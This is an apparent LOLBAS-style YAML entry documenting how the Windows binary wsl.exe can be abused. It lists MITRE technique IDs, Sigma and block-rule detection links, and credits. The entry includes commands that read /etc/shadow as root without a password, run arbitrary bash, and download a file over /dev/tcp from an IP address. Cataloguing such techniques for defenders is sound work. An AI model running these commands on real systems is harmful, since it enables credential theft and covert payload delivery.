---
Name: Wsl.exe
Description: Windows subsystem for Linux executable
Author: Matthew Brown
Created: 2019-06-27
Commands:
  - Command: wsl.exe -e /mnt/c/Windows/System32/calc.exe
    Description: Executes calc.exe from wsl.exe
    Usecase: Performs execution of specified file, can be used to execute arbitrary Linux commands.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows Server 2019, Windows 11
    Tags:
      - Execute: EXE
  - Command: wsl.exe -u root -e cat /etc/shadow
    Description: Cats /etc/shadow file as root
    Usecase: Performs execution of arbitrary Linux commands as root without need for password.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows Server 2019, Windows 11
    Tags:
      - Execute: CMD
  - Command: wsl.exe --exec bash -c "{CMD}"
    Description: Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`)
    Usecase: Performs execution of arbitrary Linux commands.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows Server 2019, Windows 11
    Tags:
      - Execute: CMD
  - Command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
    Description: Downloads file from 192.168.1.10
    Usecase: Download file
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10, Windows Server 2019, Windows 11
Full_Path:
  - Path: C:\Windows\System32\wsl.exe
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wsl_lolbin_execution.yml
  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
  - IOC: Child process from wsl.exe
Resources:
  - Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
  - Link: https://twitter.com/nas_bench/status/1535431474429808642
Acknowledgement:
  - Person: Alex Ionescu
    Handle: '@aionescu'
  - Person: Matt
    Handle: '@NotoriousRebel1'
  - Person: Asif Matadar
    Handle: '@d1r4c'
  - Person: Nasreddine Bencherchali
    Handle: '@nas_bench'
  - Person: Konrad 'unrooted' Klawikowski
---
